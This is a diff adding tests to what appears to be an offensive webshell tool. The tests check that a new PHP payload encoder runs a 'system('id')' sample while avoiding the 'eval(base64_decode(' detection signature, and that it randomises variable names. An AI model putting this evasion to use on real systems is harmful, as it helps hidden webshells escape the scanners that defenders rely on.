@@ -11,7 +11,23 @@ from webshell_sniper.encoders import TRANSFORMS, get_transform
 
 
 def test_registry_names():
-    assert set(TRANSFORMS) == {"base64", "gzip", "xor"}
+    assert set(TRANSFORMS) == {"base64", "b64var", "gzip", "xor"}
+
+
+def test_b64var_avoids_eval_base64decode_signature():
+    php = "echo 'x';system('id');"
+    out = PHPBackend().wrap_eval(get_transform("b64var").apply(php.encode()))
+    # The classic combined signature — and the base64_decode literal — are gone.
+    assert "eval(base64_decode(" not in out
+    assert "base64_decode(" not in out
+    # ...yet it still recovers the original payload.
+    blob = re.search(r"'([A-Za-z0-9+/=]+)'\)\);", out).group(1)
+    assert base64.b64decode(blob).decode() == php
+
+
+def test_b64var_randomizes_variable_names():
+    p = get_transform("b64var").apply(b"echo 1;")
+    assert PHPBackend().wrap_eval(p) != PHPBackend().wrap_eval(p)
 
 
 def test_unknown_transform_raises():
